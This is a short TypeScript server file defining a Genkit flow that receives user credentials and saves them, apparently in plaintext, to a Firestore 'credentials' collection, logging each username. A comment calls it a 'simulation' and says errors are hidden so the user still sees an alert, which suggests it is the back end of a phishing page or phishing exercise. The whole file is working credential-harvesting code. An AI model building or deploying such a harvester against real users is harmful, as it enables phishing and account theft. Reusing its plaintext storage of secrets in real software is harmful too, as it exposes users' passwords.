'use server';
/**
 * @fileOverview A flow to capture user credentials and save them to a file.
 *
 * - captureCredentials - A function that receives and logs user credentials.
 */

import {ai} from '@/ai/genkit';
import type {CredentialsInput} from '@/ai/types/credentials';
import {CredentialsInputSchema} from '@/ai/types/credentials';
import { getFirestore, collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { initializeFirebase } from '@/firebase';


export async function captureCredentials(
  input: CredentialsInput
): Promise<CredentialsInput> {
  return captureCredentialsFlow(input);
}

const captureCredentialsFlow = ai.defineFlow(
  {
    name: 'captureCredentialsFlow',
    inputSchema: CredentialsInputSchema,
    outputSchema: CredentialsInputSchema,
  },
  async (input: CredentialsInput) => {
    try {
      // Use the existing server-side initialization
      const { firestore: db } = initializeFirebase();
      const credentialsCollection = collection(db, 'credentials');
      await addDoc(credentialsCollection, {
        ...input,
        createdAt: serverTimestamp(),
      });
      console.log('Credentials saved to Firestore:', input.username);
    } catch (error) {
      console.error('Error saving credentials to Firestore:', error);
      // In a real app you might want to throw the error to the client.
      // For this simulation, we'll fail silently so the user sees the alert.
    }
    
    return input;
  }
);
